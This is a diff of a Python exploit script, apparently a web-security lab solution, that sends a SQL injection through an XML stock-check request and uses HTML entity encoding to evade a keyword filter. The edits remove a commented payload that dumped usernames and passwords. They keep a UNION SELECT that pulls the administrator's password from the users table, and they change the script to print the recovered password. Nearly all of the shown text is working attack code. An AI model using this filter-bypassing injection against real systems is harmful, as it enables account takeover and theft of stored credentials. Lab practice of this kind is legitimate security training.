@@ -47,12 +47,7 @@ def format_payload(query):
         '<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId>'
         f"<storeId>1&#x20;{formatted_query}&#x2d;&#x2d;</storeId></stockCheck>"
 )
-    
-    
-    
-"""
-   &#x55;NION &#x53;ELECT username || &#x27;~&#x27; || password &#x46;ROM users&#x2d;&#x2d;
-"""
+
 
 def main(args):
     sess = requests.Session()
@@ -82,14 +77,15 @@ def main(args):
     payload = format_payload(
         "UNION SELECT password FROM users where username='administrator'"
     )
-    )
+    
     log.info(f"Sending SQLi Payload: {payload}")
     
     if shop.no_proxy:
         resp = requests.post(url, data=payload)
     else:
         resp = requests.post(url, data=payload, proxies=utils.PROXIES, verify=False)
-    print(resp.text)
+    password = resp.text
+    print(f"The password is: {password}")
     
     
 if __name__ == "__main__":
